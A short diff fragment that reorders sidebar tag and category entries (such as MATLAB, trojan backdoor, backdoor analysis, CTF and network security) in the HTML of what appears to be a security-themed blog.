-        <span class="sidebar-tag-name" data-tags="MATLAB"><span class="iconfont-archer">&#xe606;</span>MATLAB</span>
-    
         <span class="sidebar-tag-name" data-tags="木马后门"><span class="iconfont-archer">&#xe606;</span>木马后门</span>
+    
+        <span class="sidebar-tag-name" data-tags="MATLAB"><span class="iconfont-archer">&#xe606;</span>MATLAB</span>
     
         <span class="sidebar-tag-name" data-tags="后门分析"><span class="iconfont-archer">&#xe606;</span>后门分析</span>
     
@@ -2026,9 +2024,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="CTF"><span class="iconfont-archer">&#xe60a;</span>CTF</span>
     
-        <span class="sidebar-category-name" data-categories="网络安全"><span class="iconfont-archer">&#xe60a;</span>网络安全</span>
-    
         <span class="sidebar-category-name" data-categories="神兵利器"><span class="iconfont-archer">&#xe60a;</span>神兵利器</span>
+    
+        <span class="sidebar-category-name" data-categories="网络安全"><span class="iconfont-archer">&#xe60a;</span>网络安全</span>
     
         <span class="sidebar-category-name" data-categories="移动开发"><span class="iconfont-archer">&#xe60a;</span>移动开发</span>
     
